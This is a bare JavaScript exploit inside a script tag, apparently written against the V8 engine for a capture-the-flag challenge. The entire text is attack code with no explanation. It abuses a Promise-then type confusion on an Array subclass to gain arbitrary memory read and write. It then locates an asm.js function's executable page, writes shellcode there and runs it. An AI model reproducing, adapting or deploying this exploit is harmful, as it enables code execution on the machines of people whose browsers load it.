<script>
function arb_mem(addr) {
    o[46] = (u32a[0] = addr, f64a[0]);
}
function arb_read(addr) {
    arb_mem(addr);
    return evil_ta[0];
}
function arb_write(addr, val) {
    arb_mem(addr);
    evil_ta[0] = val;
}
function hex(a, b=-1) {
    if (b != -1) {
        a = '00000000'+a.toString(16);
        b = '00000000'+b.toString(16);
        a = a.substring(a.length-8,a.length);
        b = b.substring(b.length-8,b.length);
        return '0x'+b+a;
    }
    return '0x' + a.toString(16);
}
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
Number.prototype.hex = function() {
    return '0x' + this.toString(16);
};
function gc() {
    for (let i = 0; i < 0x10000; i++)
        new String
}
let ab = new ArrayBuffer(0x100);
let f64a = new Float64Array(ab);
let u32a = new Uint32Array(ab);
const shellcode = [0x101b848,0x1010101,0x48500101,0x6f6873b8,0x1736475,0x4314801,0x2eb84824,0x616c662f,0x50705f67,0x31e78948,0x6af631d2,0x50f583b,]

gc();gc();
function Module() {
    "use asm"
    function f1() {}
    return {f1: f1}
}

class MyArray extends Array {
    constructor(a, b, c, d) {
        super(a, b, c, d);
        this.a = 0;  // Promise.Status()
        this.then = Promise.prototype.then
    }
}
let o = new MyArray(1.1, 2.2, 3.3, 4.4);
let evil_o = new Object();
let evil_ta = new Uint32Array(1);
let evil_func = Module().f1;
evil_func();
evil_o.a = o;
evil_o.b = evil_func;
evil_o.c = evil_ta;
evil_o.d = evil_o;

var p1 = Promise.resolve(o);
var p = Promise.resolve(1);
p.then(function() {
    o[47] = f64a[0];
    u32a[0] = 0x100;
    o[44] = o[45] = f64a[0];
    f64a[0] = o[31];
    let evil_func_addr = u32a[0];
    let evil_ta_addr = u32a[1];
    let backup = f64a[0] = o[46];
    let shared_info_addr = arb_read(evil_func_addr + 12 - 1);
    rwx_low = arb_read(shared_info_addr - 0xb9);
    rwx_high = arb_read(shared_info_addr - 0xb9 + 4);
    console.log(hex(rwx_low, rwx_high));
    u32a[0] = rwx_low;
    u32a[1] = rwx_high;
    o[46] = f64a[0];
    console.log(evil_func_addr.hex());
    shellcode.forEach((sc, i) => {
        evil_ta[i] = sc;
    });
    evil_func();
});
</script>
